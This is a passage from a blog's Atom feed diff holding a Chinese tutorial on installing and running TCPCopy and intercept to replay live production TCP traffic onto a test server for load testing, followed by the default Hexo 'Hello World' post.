+<li>TCPCopy是一种请求复制（所有基于tcp的packets）工具 ，其功能是复制在线数据包，修改TCP/IP头部信息，发送给测试服务器，达到欺骗测试服务器的TCP 程序的目的，从而为欺骗上层应用打下坚实基础。</li>
+</ul>
+<a id="more"></a>
+<h3 id="【TCPCopy七大功能】">【TCPCopy七大功能】</h3><ol>
+<li>分布式压力测试工具，利用在线数据，可以测试系统能够承受的压力大小（远比ab压力测试工具真实地多）,也可以提前发现一些bug</li>
+<li>普通上线测试，可以发现新系统是否稳定，提前发现上线过程中会出现的诸多问题，让开发者有信心上线</li>
+<li>对比试验，同样请求，针对不同或不同版本程序，可以做性能对比等试验</li>
+<li>流量放大功能，可以利用多种手段构造无限在线压力，满足中小网站压力测试要求</li>
+<li>利用TCPCopy转发传统压力测试工具发出的请求，可以增加网络延迟，使其压力测试更加真实</li>
+<li>热备份</li>
+</ol>
+<h3 id="【TCPCopy架构】">【TCPCopy架构】</h3><ol>
+<li>架构图<blockquote>
+<p><img src="http://inorz.net/image/tcpcopy-jiagoutu.png" alt=""></p>
+</blockquote>
+</li>
+</ol>
+<ol>
+<li>数据流向<br>&gt;<br>① 一个访问到达线上机器；<br>② socket数据包在ip层被拷贝了一份传给tcpcopy进程；<br>③ tcpcopy修改包的目的及源地址，发给目标测试机；<br>④ 拷贝的包到达目标测试机；<br>⑤ 目标测试机的应用程处理访问，并返回结果；<br>⑥ 返回结果在ip层被截获、丢弃，由intercpet进程拷贝返回结果的ip header并返回；<br>⑦ ip header被发送给线上机器的tcpcopy进程。</li>
+</ol>
+<h3 id="【TCPCopy安装】">【TCPCopy安装】</h3><ol>
+<li>tcpcopy下载：<a href="https://github.com/wangbin579/tcpcopy" target="_blank" rel="external">https://github.com/wangbin579/tcpcopy</a></li>
+<li>intercept下载：<a href="https://github.com/session-replay-tools/intercept/releases" target="_blank" rel="external">https://github.com/session-replay-tools/intercept/releases</a></li>
+<li><p>生产服安装tcpcop，这里下载的是0.9.6版本。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tar xf tcpcopy-<span class="number">0.9</span>.<span class="number">6</span>.tar.gz</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"><span class="comment">#　</span></span><br><span class="line"><span class="comment">#做个软链接，方便使用</span></span><br><span class="line">ln <span class="operator">-s</span> /usr/<span class="built_in">local</span>/tcpcopy/sbin/tcpcopy /usr/<span class="built_in">local</span>/bin/</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>测试服安装 intercept，这里下载1.0.0版本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tar xf intercept-<span class="number">1.0</span>.<span class="number">0</span>.tar.gz</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"><span class="comment">#做个软链接，方便使用</span></span><br><span class="line">ln <span class="operator">-s</span> /usr/<span class="built_in">local</span>/intercept/sbin/intercept /usr/<span class="built_in">local</span>/bin/</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 安装intercept时，如果遇到：checking for pcap.h ... not found。</span></span><br><span class="line"><span class="comment"># 解决：yum install libpcap-devel -y</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="【TCPCopy使用（实时）】">【TCPCopy使用（实时）】</h3><ol>
+<li><p>测试服，运行intercept服务端程序，指定IP为生产服（源IP）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 使用前要先启用内核模块ip_queue支持</span></span><br><span class="line">modprobe ip_queue</span><br><span class="line"><span class="comment">#　</span></span><br><span class="line"><span class="comment"># 2. 检查一下是否有启用</span></span><br><span class="line">lsmod|grep ip_queue</span><br><span class="line">　</span><br><span class="line"><span class="comment"># 3. 运行 intercept</span></span><br><span class="line">intercept -i eth0 -F <span class="string">'tcp and src port 80'</span> <span class="operator">-d</span> <span class="operator">-l</span> /data/logs/intercept.log</span><br><span class="line">　</span><br><span class="line"><span class="comment">#参数：</span></span><br><span class="line"><span class="comment"># -i 指定网卡</span></span><br><span class="line"><span class="comment"># -F 指定源端口为80端口</span></span><br><span class="line"><span class="comment"># -d 启动为守护进程</span></span><br><span class="line"><span class="comment"># -l 指定log日志</span></span><br><span class="line"><span class="comment"># 更多的参数可 intercept -h 来查看</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>生产服，运行TcpCopy客户端程序，指定发送IP为测试服IP：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tcpcopy -x <span class="number">80</span>-测试服IP:<span class="number">80</span> <span class="operator">-s</span> 测试服IP <span class="operator">-l</span> /data/logs/tcpcopy.log <span class="operator">-d</span></span><br><span class="line">　</span><br><span class="line"><span class="comment"># 参数</span></span><br><span class="line"><span class="comment"># -d 是做为守护进程方式运行</span></span><br><span class="line"><span class="comment"># -l 是记录日志 -l /data/logs/tcpcopy_log.log</span></span><br><span class="line"><span class="comment"># -s 指定intercept服务器</span></span><br><span class="line"><span class="comment"># -n 复制几倍流量，不加参数默认为1，最大值为1023</span></span><br><span class="line"><span class="comment"># -r 复制部分流量，比如 -r 20，即为复制20%的流量。传参数范围为1-99，其他数值都是默认为全部流量复制</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>测试：运行完可以通过tcpdump命令来抓包查看80端口的收发包情况。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -S port <span class="number">80</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="【TCPCopy使用（离线）】">【TCPCopy使用（离线）】</h3><ol>
+<li><p>测试服，使用tcpdump抓包，并保存抓包文件。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0 tcp and port <span class="number">80</span> <span class="operator">-s</span> <span class="number">0</span> -w /data/logs/online_80.pcap</span><br><span class="line">　</span><br><span class="line"><span class="comment">#参数</span></span><br><span class="line"><span class="comment">#-s 获取数据包，默认为68字节，设置成0，获取全部数据包</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>生产服，运行TcpCopy客户端程序，指定发送IP为测试服IP：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpcopy -x <span class="number">80</span>-测试服IP:<span class="number">80</span> -i /data/logs/online_80.pcap <span class="operator">-l</span> /data/logs/tcpcopy.log <span class="operator">-d</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="【注意事项】">【注意事项】</h3><ol>
+<li>不支持域名，只支持IP地址。</li>
+<li>如果采用的是IP Queue模块来截获响应包，所以intercept程序密切跟ip queue内核模块相关，所以当压力很大的时候请求丢失率很高，需要优化sysctl系统参数才能达到好的效果。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看ip queue运行情况，</span></span><br><span class="line">cat /proc/net/ip_queue</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 如果Queue dropped的数值不断增大，则需要修改ip_queue_maxlen参数</span></span><br><span class="line"><span class="comment"># 比如echo 4096 &gt; /proc/sys/net/ipv4/ip_queue_maxlen</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 如果Netlink dropped的数值不断增大，修改net.core.rmem_max和net.core.wmem_max参数</span></span><br><span class="line"><span class="comment"># 比如 sysctl -w net.core.rmem_max=16777216和sysctl -w net.core.wmem_max=16777216）</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+]]></content>
+    <summary type="html">
+    <![CDATA[有台服务器的MySQL内存，经常内涨跑涨高，所以为了调试，在一台测试机器上搭建了同样的服务，部署了同样的代码，用TcpCopy做引流做测试。]]>
+    
+    </summary>
+    
+      <category term="tcp" scheme="http://www.inorz.net/tags/tcp/"/>
+    
+      <category term="tcpcopy" scheme="http://www.inorz.net/tags/tcpcopy/"/>
+    
+      <category term="测试" scheme="http://www.inorz.net/tags/%E6%B5%8B%E8%AF%95/"/>
+    
+      <category term="工具使用" scheme="http://www.inorz.net/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[Hello World]]></title>
+    <link href="http://www.inorz.net/2015/05/19/hello-world/"/>
+    <id>http://www.inorz.net/2015/05/19/hello-world/</id>
+    <published>2015-05-19T14:45:48.000Z</published>
+    <updated>2015-10-28T08:45:12.000Z</updated>
+    <content type="html"><![CDATA[<p>Welcome to <a href="http://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="http://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="http://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
+<a id="more"></a>
+<h2 id="Quick_Start">Quick Start</h2><h3 id="Create_a_new_post">Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
+<p>More info: <a href="http://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
+<h3 id="Run_server">Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="http://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
+<h3 id="Generate_static_files">Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="http://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
+<h3 id="Deploy_to_remote_sites">Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="http://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>Welcome to <a href="http://hexo.io/">Hexo</a>! This is your very first post. Check <a href="http://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="http://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>]]>
+    
+    </summary>
+    
+  </entry>
+  
+</feed>
